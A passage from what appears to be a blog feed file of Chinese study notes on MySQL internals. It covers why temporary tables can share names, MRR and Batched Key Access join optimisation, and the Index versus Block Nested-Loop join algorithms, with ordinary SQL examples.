过程用上表的索引，确认方法是 explain 结果里没有 Using temporary 和 Using filesort；</li><li>如果 group by 需要统计的数据量不大，尽量只使用内存临时表；也可以通过适当调大 tmp_table_size 参数，来避免用到磁盘临时表；</li><li>如果数据量实在太大，使用 SQL_BIG_RESULT 这个提示，来告诉优化器直接使用排序算法得到 group by 的结果。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36 为什么临时表可以重名</title>
      <link href="/why-can-temporary-tables-be-renamed/"/>
      <url>/why-can-temporary-tables-be-renamed/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解临时表的特性</li><li>了解临时表的应用场景</li></ul><a id="more"></a><p>在上一篇文章中，在优化 join 查询的时候使用到了临时表。当时，是这么用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create temporary table temp_t like t1;</span><br><span class="line">alter table temp_t add index(b);</span><br><span class="line">insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;</span><br><span class="line">select * from t1 join temp_t on (t1.b&#x3D;temp_t.b);</span><br></pre></td></tr></table></figure><p>你可能会有疑问，为什么要用临时表呢？直接用普通表是不是也可以呢？</p><p>今天我们就从这个问题说起：临时表有哪些特征，为什么它适合这个场景？</p><p>这里，我需要先帮你厘清一个容易误解的问题：有的人可能会认为，临时表就是内存表。但是，这两个概念可是完全不同的。</p><ul><li>内存表，指的是使用 Memory 引擎的表，建表语法是 <code>create table … engine=memory</code>。这种表的数据都保存在内存里，系统重启的时候会被清空，但是表结构还在。除了这两个特性看上去比较“奇怪”外，从其他的特征上看，它就是一个正常的表。</li><li>而临时表，可以使用各种引擎类型 。如果是使用 InnoDB 引擎或者 MyISAM 引擎的临时表，写数据的时候是写到磁盘上的。当然，临时表也可以使用 Memory 引擎。</li></ul><p>弄清楚了内存表和临时表的区别以后，我们再来看看临时表有哪些特征。</p><h2 id="临时表的特性"><a href="#临时表的特性" class="headerlink" title="临时表的特性"></a>临时表的特性</h2><p>为了便于理解，我们来看下下面这个操作序列：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816152151.png" alt=""></p><p>可以看到，临时表在使用上有以下几个特点：</p><ol><li>建表语法是 <code>create temporary table …</code>。</li><li>一个临时表只能被创建它的 session 访问，对其他线程不可见。所以，图中 session A 创建的临时表 t，对于 session B 就是不可见的。</li><li>临时表可以与普通表同名。</li><li>session A 内有同名的临时表和普通表的时候，show create 语句，以及增删改查语句访问的是临时表。</li><li>show tables 命令不显示临时表。</li></ol><p>由于临时表只能被创建它的 session 访问，<strong>所以在这个 session 结束的时候，会自动删除临时表</strong>。也正是由于这个特性，临时表就特别适合我们文章开头的 join 优化这种场景。为什么呢？</p><p>原因主要包括以下两个方面：</p><ol><li>不同 session 的临时表是可以重名的，如果有多个 session 同时执行 join 优化，不需要担心表名重复导致建表失败的问题。</li><li>不需要担心数据删除问题。如果使用普通表，在流程执行过程中客户端发生了异常断开，或者数据库发生异常重启，还需要专门来清理中间过程中生成的数据表。而临时表由于会自动回收，所以不需要这个额外的操作。</li></ol><h2 id="临时表的应用"><a href="#临时表的应用" class="headerlink" title="临时表的应用"></a>临时表的应用</h2><p>由于不用担心线程之间的重名冲突，临时表经常会被用在复杂查询的优化过程中。其中，分库分表系统的跨库查询就是一个典型的使用场景。</p><h2 id="为什么临时表可以重名"><a href="#为什么临时表可以重名" class="headerlink" title="为什么临时表可以重名"></a>为什么临时表可以重名</h2><p>当我们使用建表语句创建临时表时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create temporary table temp_t(id int primary key)engine&#x3D;innodb;</span><br></pre></td></tr></table></figure><p>这个时候，MySQL 要给这个 InnoDB 表创建一个 frm 文件保存表结构定义，还要有地方保存表数据。</p><p>这个 frm 文件放在临时文件目录下，文件名的后缀是.frm，前缀是“#sql{进程 id}<em>{线程 id}</em> 序列号”。你可以使用 select @@tmpdir 命令，来显示实例的临时文件目录。</p><p>而关于表中数据的存放方式，在不同的 MySQL 版本中有着不同的处理方式：</p><ul><li>在 5.6 以及之前的版本里，MySQL 会在临时文件目录下创建一个相同前缀、以.ibd 为后缀的文件，用来存放数据文件；</li><li>而从 5.7 版本开始，MySQL 引入了一个临时文件表空间，专门用来存放临时文件的数据。因此，我们就不需要再创建 ibd 文件了。</li></ul><p>从文件名的前缀规则，我们可以看到，其实创建一个叫作 t1 的 InnoDB 临时表，MySQL 在存储上认为我们创建的表名跟普通表 t1 是不同的，因此同一个库下面已经有普通表 t1 的情况下，还是可以再创建一个临时表 t1 的。</p><p>为了便于后面讨论，我先来举一个例子。</p><p>临时表的命名：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220816152846.png" alt=""></p><p>这个进程的进程号是 1234，session A 的线程 id 是 4，session B 的线程 id 是 5。所以你看到了，session A 和 session B 创建的临时表，在磁盘上的文件不会重名。</p><p>MySQL 维护数据表，除了物理上要有文件外，内存里面也有一套机制区别不同的表，每个表都对应一个 table_def_key。</p><p>一个普通表的 table_def_key 的值是由“库名 + 表名”得到的，所以如果你要在同一个库下创建两个同名的普通表，创建第二个表的过程中就会发现 table_def_key 已经存在了。<br>而对于临时表，table_def_key 在“库名 + 表名”基础上，又加入了“server_id+thread_id”。<br>也就是说，session A 和 sessionB 创建的两个临时表 t1，它们的 table_def_key 不同，磁盘文件名也不同，因此可以并存。</p><p>在实现上，每个线程都维护了自己的临时表链表。这样每次 session 内操作表的时候，先遍历链表，检查是否有这个名字的临时表，如果有就优先操作临时表，如果没有再操作普通表；在 session 结束的时候，对链表里的每个临时表，执行 “DROP TEMPORARY TABLE + 表名”操作。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>内存表，指的是使用 Memory 引擎的表; 而临时表，可以使用各种引擎类型。</li><li>上面说到的这种临时表，是用户自己创建的 ，也可以称为用户临时表。</li><li>临时表可以与普通表同名</li><li>临时表只能被创建它的 session 访问，在这个 session 结束的时候，会自动删除对应的临时表</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>35 join语句怎么优化</title>
      <link href="/how-to-optimize-the-join-statement/"/>
      <url>/how-to-optimize-the-join-statement/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ol><li>了解 MRR 优化</li><li>了解 BKA 算法</li></ol><a id="more"></a><p>在上一篇文章中，了解了 join 语句的两种算法，分别是 Index Nested-Loop Join(NLJ) 和 Block Nested-Loop Join(BNL)。</p><p>NLJ 算法，效果其实还是不错的，比通过应用层拆分成多个语句然后再拼接查询结果更方便，而且性能也不会差。</p><p>但是，BNL 算法在大表 join 的时候性能就差多了，比较次数等于两个表参与 join 的行数的乘积，很消耗 CPU 资源。</p><h2 id="Multi-Range-Read-优化"><a href="#Multi-Range-Read-优化" class="headerlink" title="Multi-Range Read 优化"></a>Multi-Range Read 优化</h2><p>在介绍 join 语句的优化方案之前，我需要先和你介绍一个知识点，即：Multi-Range Read 优化 (MRR)。这个优化的主要目的是尽量使用顺序读盘。</p><p>在第 4 篇文章中，我和你介绍 InnoDB 的索引结构时，提到了“回表”的概念。我们先来回顾一下这个概念。回表是指，InnoDB 在普通索引 a 上查到主键 id 的值后，再根据一个个主键 id 的值到主键索引上去查整行数据的过程。</p><p>因为主键索引是一棵 B+ 树，在这棵树上，每次只能根据一个主键 id 查到一行数据。因此，回表是一行行搜索主键索引的，基本流程如图 1 所示。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220705212100.png" alt=""><br>如果随着 a 的值递增顺序查询的话，id 的值就变成随机的，那么就会出现随机访问，性能相对较差。虽然“按行查”这个机制不能改，但是调整查询的顺序，还是能够加速的。</p><p>因为大多数的数据都是按照主键递增顺序插入得到的，所以我们可以认为，如果按照主键的递增顺序查询的话，对磁盘的读比较接近顺序读，能够提升读性能。</p><p>这就是 MRR 优化的设计思路。此时，语句的执行流程变成了这样：</p><ol><li>根据索引 a，定位到满足条件的记录，将 id 值放入 read_rnd_buffer 中 </li><li>将 read_rnd_buffer 中的 id 进行递增排序</li><li>排序后的 id 数组，依次到主键 id 索引中查记录，并作为结果返回</li></ol><p>这里，read_rnd_buffer 的大小是由 read_rnd_buffer_size 参数控制的。如果步骤 1 中，read_rnd_buffer 放满了，就会先执行完步骤 2 和 3，然后清空 read_rnd_buffer。之后继续找索引 a 的下个记录，并继续循环。</p><p>另外需要说明的是，如果你想要稳定地使用 MRR 优化的话，需要设置set optimizer_switch=”mrr_cost_based=off”。（官方文档的说法，是现在的优化器策略，判断消耗的时候，会更倾向于不使用 MRR，把 mrr_cost_based 设置为 off，就是固定使用 MRR 了。）</p><p>下面两幅图就是使用了 MRR 优化后的执行流程和 explain 结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220705212316.png" alt=""></p><p>MRR 执行流程的 explain 结果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220705212412.png" alt=""></p><p>从图 3 的 explain 结果中，我们可以看到 Extra 字段多了 Using MRR，表示的是用上了 MRR 优化。而且，由于我们在 read_rnd_buffer 中按照 id 做了排序，所以最后得到的结果集也是按照主键 id 递增顺序的，也就是与图 1 结果集中行的顺序相反。</p><p><strong>MRR 能够提升性能的核心</strong>在于，这条查询语句在索引 a 上做的是一个范围查询（也就是说，这是一个多值查询），可以得到足够多的主键 id。这样通过排序以后，再去主键索引查数据，才能体现出“顺序性”的优势。</p><h2 id="Batched-Key-Access"><a href="#Batched-Key-Access" class="headerlink" title="Batched Key Access"></a>Batched Key Access</h2><p>理解了 MRR 性能提升的原理，我们就能理解 MySQL 在 5.6 版本后开始引入的 Batched Key Access(BKA) 算法了。这个 BKA 算法，其实就是对 NLJ 算法的优化。</p><p>我们再来看看上一篇文章中用到的 NLJ 算法的流程图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220705212711.png" alt=""><br>NLJ 算法执行的逻辑是：从驱动表 t1，一行行地取出 a 的值，再到被驱动表 t2 去做 join。也就是说，对于表 t2 来说，每次都是匹配一个值。这时，MRR 的优势就用不上了。</p><p>那怎么才能一次性地多传些值给表 t2 呢？方法就是，从表 t1 里一次性地多拿些行出来，一起传给表 t2。</p><p>既然如此，我们就把表 t1 的数据取出来一部分，先放到一个临时内存。这个临时内存不是别人，就是 join_buffer。</p><p>通过上一篇文章，我们知道 join_buffer 在 BNL 算法里的作用，是暂存驱动表的数据。但是在 NLJ 算法里并没有用。那么，我们刚好就可以复用 join_buffer 到 BKA 算法中。</p><p>如图 5 所示，是上面的 NLJ 算法优化后的 BKA 算法的流程。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220705212812.png" alt=""></p><p>图中，我在 join_buffer 中放入的数据是 P1<del>P100，表示的是只会取查询需要的字段。当然，如果 join buffer 放不下 P1</del>P100 的所有数据，就会把这 100 行数据分成多段执行上图的流程。</p><p>那么，这个 BKA 算法到底要怎么启用呢？</p><p>如果要使用 BKA 优化算法的话，你需要在执行 SQL 语句之前，先设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set optimizer_switch&#x3D;&#39;mrr&#x3D;on,mrr_cost_based&#x3D;off,batched_key_access&#x3D;on&#39;;</span><br></pre></td></tr></table></figure><p>其中，前两个参数的作用是要启用 MRR。这么做的原因是，BKA 算法的优化要依赖于 MRR。</p><h2 id="BNL-算法的性能问题"><a href="#BNL-算法的性能问题" class="headerlink" title="BNL 算法的性能问题"></a>BNL 算法的性能问题</h2><p>说完了 NLJ 算法的优化，再来看 BNL 算法的优化。</p><p>由于 InnoDB 对 Bufffer Pool 的 LRU 算法做了优化，即：第一次从磁盘读入内存的数据页，会先放在 old 区域。如果 1 秒之后这个数据页不再被访问了，就不会被移动到 LRU 链表头部，这样对 Buffer Pool 的命中率影响就不大。</p><p>但是，如果一个使用 BNL 算法的 join 语句，多次扫描一个冷表，而且这个语句执行时间超过 1 秒，就会在再次扫描冷表的时候，把冷表的数据页移到 LRU 链表头部。</p><p>这种情况对应的，是冷表的数据量小于整个 Buffer Pool 的 3/8，能够完全放入 old 区域的情况。</p><p>如果这个冷表很大，就会出现另外一种情况：业务正常访问的数据页，没有机会进入 young 区域。</p><p>由于优化机制的存在，一个正常访问的数据页，要进入 young 区域，需要隔 1 秒后再次被访问到。但是，由于我们的 join 语句在循环读磁盘和淘汰内存页，进入 old 区域的数据页，很可能在 1 秒之内就被淘汰了。这样，就会导致这个 MySQL 实例的 Buffer Pool 在这段时间内，young 区域的数据页没有被合理地淘汰。</p><p>也就是说，这两种情况都会影响 Buffer Pool 的正常运作。</p><p>大表 join 操作虽然对 IO 有影响，但是在语句执行结束后，对 IO 的影响也就结束了。但是，对 Buffer Pool 的影响就是持续性的，需要依靠后续的查询请求慢慢恢复内存命中率。</p><p>为了减少这种影响，你可以考虑增大 join_buffer_size 的值，减少对被驱动表的扫描次数。</p><p>也就是说，BNL 算法对系统的影响主要包括三个方面：</p><ol><li>可能会多次扫描被驱动表，占用磁盘 IO 资源；</li><li>判断 join 条件需要执行 M*N 次对比（M、N 分别是两张表的行数），如果是大表就会占用非常多的 CPU 资源；</li><li>可能会导致 Buffer Pool 的热数据被淘汰，影响内存命中率。</li></ol><p>我们执行语句之前，需要通过理论分析和查看 explain 结果的方式，确认是否要使用 BNL 算法。如果确认优化器会使用 BNL 算法，就需要做优化。优化的常见做法是，给被驱动表的 join 字段加上索引，把 BNL 算法转成 BKA 算法。</p><h2 id="BNL-转-BKA"><a href="#BNL-转-BKA" class="headerlink" title="BNL 转 BKA"></a>BNL 转 BKA</h2><p>一些情况下，我们可以直接在被驱动表上建索引，这时就可以直接转成 BKA 算法了。</p><p>但是，有时候你确实会碰到一些不适合在被驱动表上建索引的情况。比如下面这个语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1 join t2 on (t1.b&#x3D;t2.b) where t2.b&gt;&#x3D;1 and t2.b&lt;&#x3D;2000;</span><br></pre></td></tr></table></figure><p>我们在文章开始的时候，在表 t2 中插入了 100 万行数据，但是经过 where 条件过滤后，需要参与 join 的只有 2000 行数据。如果这条语句同时是一个低频的 SQL 语句，那么再为这个语句在表 t2 的字段 b 上创建一个索引就很浪费了。</p><p>但是，如果使用 BNL 算法来 join 的话，这个语句的执行流程是这样的：</p><ol><li>把表 t1 的所有字段取出来，存入 join_buffer 中。这个表只有 1000 行，join_buffer_size 默认值是 256k，可以完全存入。</li><li>扫描表 t2，取出每一行数据跟 join_buffer 中的数据进行对比，</li><li>如果不满足 t1.b=t2.b，则跳过；<ul><li>如果满足 t1.b=t2.b, 再判断其他条件，也就是是否满足 t2.b 处于 [1,2000] 的条件，</li><li>如果是，就作为结果集的一部分返回，否则跳过。</li></ul></li></ol><p>我在上一篇文章中说过，对于表 t2 的每一行，判断 join 是否满足的时候，都需要遍历 join_buffer 中的所有行。因此判断等值条件的次数是 1000*100 万 =10 亿次，这个判断的工作量很大。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220705213624.png" alt=""></p><p>可以看到，explain 结果里 Extra 字段显示使用了 BNL 算法。在我的测试环境里，这条语句需要执行 1 分 11 秒。</p><p>在表 t2 的字段 b 上创建索引会浪费资源，但是不创建索引的话这个语句的等值条件要判断 10 亿次，想想也是浪费。那么，有没有两全其美的办法呢？</p><p>这时候，我们可以考虑使用临时表。使用临时表的大致思路是：</p><ol><li>把表 t2 中满足条件的数据放在临时表 tmp_t 中；</li><li>为了让 join 使用 BKA 算法，给临时表 tmp_t 的字段 b 加上索引；</li><li>让表 t1 和 tmp_t 做 join 操作。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create temporary table temp_t(id int primary key, a int, b int, index(b))engine&#x3D;innodb;</span><br><span class="line">insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;</span><br><span class="line">select * from t1 join temp_t on (t1.b&#x3D;temp_t.b);</span><br></pre></td></tr></table></figure><p>可以看到，整个过程 3 个语句执行时间的总和还不到 1 秒，相比于前面的 1 分 11 秒，性能得到了大幅提升。接下来，我们一起看一下这个过程的消耗：</p><p>执行 insert 语句构造 temp_t 表并插入数据的过程中，对表 t2 做了全表扫描，这里扫描行数是 100 万。<br>之后的 join 语句，扫描表 t1，这里的扫描行数是 1000；join 比较过程中，做了 1000 次带索引的查询。相比于优化前的 join 语句需要做 10 亿次条件判断来说，这个优化效果还是很明显的。<br>总体来看，不论是在原表上加索引，还是用有索引的临时表，我们的思路都是让 join 语句能够用上被驱动表上的索引，来触发 BKA 算法，提升查询性能。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>BKA 优化是 MySQL 已经内置支持的，建议默认使用</li><li>BNL 算法效率低，建议都尽量转成 BKA 算法。优化的方向就是给被驱动表的关联字段加上索引</li><li>基于临时表的改进方案，对于能够提前过滤出小数据的 join 语句来说，效果还是很好的</li><li>MySQL 目前的版本还不支持 hash join，但可以配合应用端自己模拟出来，理论上效果要好于临时表的方案</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>34 到底可不可以使用join</title>
      <link href="/is-it-possible-to-use-join/"/>
      <url>/is-it-possible-to-use-join/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ol><li>了解有索引的情况下，join 的过程</li><li>了解没有索引的情况下，join 的过程</li><li>了解几种 join 算法的区别</li></ol><a id="more"></a><p>为了便于量化分析，我还是创建两个表 t1 和 t2 来和你说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;t2&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;a&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;b&#96; int(11) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;a&#96; (&#96;a&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB;</span><br><span class="line"> </span><br><span class="line">drop procedure idata;</span><br><span class="line">delimiter ;;</span><br><span class="line">create procedure idata()</span><br><span class="line">begin</span><br><span class="line">  declare i int;</span><br><span class="line">  set i&#x3D;1;</span><br><span class="line">  while(i&lt;&#x3D;1000)do</span><br><span class="line">    insert into t2 values(i, i, i);</span><br><span class="line">    set i&#x3D;i+1;</span><br><span class="line">  end while;</span><br><span class="line">end;;</span><br><span class="line">delimiter ;</span><br><span class="line">call idata();</span><br><span class="line"> </span><br><span class="line">create table t1 like t2;</span><br><span class="line">insert into t1 (select * from t2 where id&lt;&#x3D;100)</span><br></pre></td></tr></table></figure><p>可以看到，这两个表都有一个主键索引 id 和一个索引 a，字段 b 上无索引。存储过程 idata() 往表 t2 里插入了 1000 行数据，在表 t1 里插入的是 100 行数据。</p><h2 id="Index-Nested-Loop-Join"><a href="#Index-Nested-Loop-Join" class="headerlink" title="Index Nested-Loop Join"></a>Index Nested-Loop Join</h2><p>先来看一下这个语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1 straight_join t2 on (t1.a&#x3D;t2.a);</span><br></pre></td></tr></table></figure><p>这里改用 <code>straight_join</code> 让 MySQL 使用固定的连接方式执行查询，这样优化器只会按照我们指定的方式去 join。在这个语句里，t1 是驱动表，t2 是被驱动表。</p><p>现在，我们来看一下这条语句的 explain 结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220826144415.png" alt=""></p><p>可以看到，在这条语句里，被驱动表 t2 的字段 a 上有索引，join 过程用上了这个索引，因此这个语句的执行流程是这样的：</p><ol><li>从表 t1 中读入一行数据 R</li><li>从数据行 R 中，取出 a 字段到表 t2 里去查找</li><li>取出表 t2 中满足条件的行，跟 R 组成一行，作为结果集的一部分</li><li>重复执行步骤 1 到 3，直到表 t1 的末尾循环结束</li></ol><p>这个过程是先遍历表 t1，然后根据从表 t1 中取出的每行数据中的 a 值，去表 t2 中查找满足条件的记录。在形式上，这个过程就跟我们写程序时的嵌套查询类似，并且可以用上被驱动表的索引，所以我们称之为“Index Nested-Loop Join”，简称 NLJ。</p><p>对应的流程图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220704212413.png" alt=""></p><p>在这个流程里：</p><ol><li>对驱动表 t1 做了全表扫描，这个过程需要扫描 100 行</li><li>而对于每一行 R，根据 a 字段去表 t2 查找，走的是树搜索过程。由于我们构造的数据都是一一对应的，因此每次的搜索过程都只扫描一行，也是总共扫描 100 行</li><li>所以，整个执行流程，总扫描行数是 200</li></ol><p>在知道了这个过程之后，再来回答一下文章开头的两个问题。</p><p>先看第一个问题：<strong>能不能使用 join</strong>?</p><p>这里假设不使用 join，那就只能用单表查询。我们看看上面这条语句的需求，用单表查询怎么实现。</p><ol><li>执行select * from t1，查出表 t1 的所有数据，这里有 100 行</li><li>循环遍历这 100 行数据</li><li>从每一行 R 取出字段 a 的值 $R.a</li><li>执行select * from t2 where a=$R.a</li><li>把返回的结果和 R 构成结果集的一行</li></ol><p>可以看到，在这个查询过程，也是扫描了 200 行，但是总共执行了 101 条语句，比直接 join 多了 100 次交互。除此之外，客户端还要自己拼接 SQL 语句和结果。</p><p>显然，这么做还不如直接 join 来得方便。</p><p>那么再来看看第二个问题：<strong>怎么选择驱动表</strong>？</p><p>在这个 join 语句执行过程中，驱动表是走全表扫描，而被驱动表是走树搜索。</p><p>假设被驱动表的行数是 M。每次在被驱动表查一行数据，要先搜索索引 a，再搜索主键索引。每次搜索一棵树近似复杂度是以 2 为底的 M 的对数，记为 log2M，所以在被驱动表上查一行的时间复杂度是 2*log2M。</p><p>假设驱动表的行数是 N，执行过程就要扫描驱动表 N 行，然后对于每一行，到被驱动表上匹配一次。</p><p>因此整个执行过程，近似复杂度是 N + N<em>2</em>log2M。</p><p>显然，N 对扫描行数的影响更大，因此应该让小表来做驱动表。</p><p>到这里小结一下，通过上面的分析我们得到了两个结论：</p><ol><li>使用 join 语句，性能比强行拆成多个单表执行 SQL 语句的性能要好</li><li>如果使用 join 语句的话，需要让小表做驱动表</li></ol><h2 id="Simple-Nested-Loop-Join"><a href="#Simple-Nested-Loop-Join" class="headerlink" title="Simple Nested-Loop Join"></a>Simple Nested-Loop Join</h2><p>现在，我们把 SQL 语句改成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1 straight_join t2 on (t1.a&#x3D;t2.b);</span><br></pre></td></tr></table></figure><p>由于表 t2 的字段 b 上没有索引，因此再用图 2 的执行流程时，每次到 t2 去匹配的时候，就要做一次全表扫描。</p><p>你可以先设想一下这个问题，继续使用图 2 的算法，是不是可以得到正确的结果呢？如果只看结果的话，这个算法是正确的，而且这个算法也有一个名字，叫做“Simple Nested-Loop Join”。</p><p>但是，这样算来，这个 SQL 请求就要扫描表 t2 多达 100 次，总共扫描 100*1000=10 万行。</p><p>这还只是两个小表，如果 t1 和 t2 都是 10 万行的表（当然了，这也还是属于小表的范围），就要扫描 100 亿行，这个算法看上去太“笨重”了。</p><p>当然，MySQL 也没有使用这个 Simple Nested-Loop Join 算法，而是使用了另一个叫作“Block Nested-Loop Join”的算法，简称 BNL。</p><h2 id="Block-Nested-Loop-Join"><a href="#Block-Nested-Loop-Join" class="headerlink" title="Block Nested-Loop Join"></a>Block Nested-Loop Join</h2><p>这时候，被驱动表上没有可用的索引，算法的流程是这样的：</p><p>把表 t1 的数据读入线程内存 join_buffer 中，由于我们这个语句中写的是 select *，因此是把整个表 t1 放入了内存；</p><p>扫描表 t2，把表 t2 中的每一行取出来，跟 join_buffer 中的数据做对比，满足 join 条件的，作为结果集的一部分返回。</p><p>这个过程的流程图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220704213413.png" alt=""><br>对应地，这条 SQL 语句的 explain 结果如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220826144430.png" alt=""></p><p>可以看到，在这个过程中，对表 t1 和 t2 都做了一次全表扫描，因此总的扫描行数是 1100。由于 join_buffer 是以无序数组的方式组织的，因此对表 t2 中的每一行，都要做 100 次判断，总共需要在内存中做的判断次数是：100*1000=10 万次。</p><p>前面我们说过，如果使用 Simple Nested-Loop Join 算法进行查询，扫描行数也是 10 万行。因此，从时间复杂度上来说，这两个算法是一样的。但是，Block Nested-Loop Join 算法的这 10 万次判断是内存操作，速度上会快很多，性能也更好。</p><p>接下来，我们来看一下，在这种情况下，应该选择哪个表做驱动表。</p><p>假设小表的行数是 N，大表的行数是 M，那么在这个算法里：</p><ol><li>两个表都做一次全表扫描，所以总的扫描行数是 M+N；</li><li>内存中的判断次数是 M*N。</li></ol><p>可以看到，调换这两个算式中的 M 和 N 没差别，因此这时候选择大表还是小表做驱动表，执行耗时是一样的。</p><p>然后，你可能马上就会问了，这个例子里表 t1 才 100 行，要是表 t1 是一个大表，join_buffer 放不下怎么办呢？</p><p>join_buffer 的大小是由参数 join_buffer_size 设定的，默认值是 256k。如果放不下表 t1 的所有数据话，策略很简单，就是分段放。我把 join_buffer_size 改成 1200，再执行上面的语句，执行过程就变成了：</p><ol><li>扫描表 t1，顺序读取数据行放入 join_buffer 中，放完第 88 行 join_buffer 满了，继续第 2 步</li><li>扫描表 t2，把 t2 中的每一行取出来，跟 join_buffer 中的数据做对比，满足 join 条件的，作为结果集的一部分返回</li><li>清空 join_buffer</li><li>继续扫描表 t1，顺序读取最后的 12 行数据放入 join_buffer 中，继续执行第 2 步</li></ol><p>执行流程图也变成了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220704213804.png" alt=""></p><p>图中的步骤 4 和 5，表示清空 join_buffer 再复用。</p><p>这个流程才体现出了这个算法名字中“Block”的由来，表示“分块去 join”。</p><p>可以看到，这时候由于表 t1 被分成了两次放入 join_buffer 中，导致表 t2 会被扫描两次。虽然分成两次放入 join_buffer，但是判断等值条件的次数还是不变的，依然是 (88+12)*1000=10 万次。</p><p>我们再来看下，在这种情况下驱动表的选择问题。</p><p>假设，驱动表的数据行数是 N，需要分 K 段才能完成算法流程，被驱动表的数据行数是 M。</p><p>注意，这里的 K 不是常数，N 越大 K 就会越大，因此把 K 表示为λ*N，显然λ的取值范围是 (0,1)。</p><p>所以，在这个算法的执行过程中：</p><p>扫描行数是 N+λ<em>N</em>M；<br>内存判断 N*M 次。<br>显然，内存判断次数是不受选择哪个表作为驱动表影响的。而考虑到扫描行数，在 M 和 N 大小确定的情况下，N 小一些，整个算式的结果会更小。</p><p>所以结论是，应该让小表当驱动表。</p><p>当然，你会发现，在 N+λ<em>N</em>M 这个式子里，λ才是影响扫描行数的关键因素，这个值越小越好。</p><p>刚刚我们说了 N 越大，分段数 K 越大。那么，N 固定的时候，什么参数会影响 K 的大小呢？（也就是λ的大小）答案是 join_buffer_size。join_buffer_size 越大，一次可以放入的行越多，分成的段数也就越少，对被驱动表的全表扫描次数就越少。</p><p>这就是为什么，你可能会看到一些建议告诉你，如果你的 join 语句很慢，就把 join_buffer_size 改大。</p><p>理解了 Mysql 的两种 join 算法，现在再来试着回答文章开头的两个问题。</p><p>第一个问题：<strong>能不能使用 join 语句</strong>？</p><ol><li>如果可以使用 Index Nested-Loop Join 算法，也就是说可以用上被驱动表上的索引，其实是没问题的</li><li>如果使用 Block Nested-Loop Join 算法，扫描行数就会过多。尤其是在大表上的 join 操作，这样可能要扫描被驱动表很多次，会占用大量的系统资源。所以这种 join 尽量不要用</li></ol><p>如何判断要不要使用 join 语句时，就是看 explain 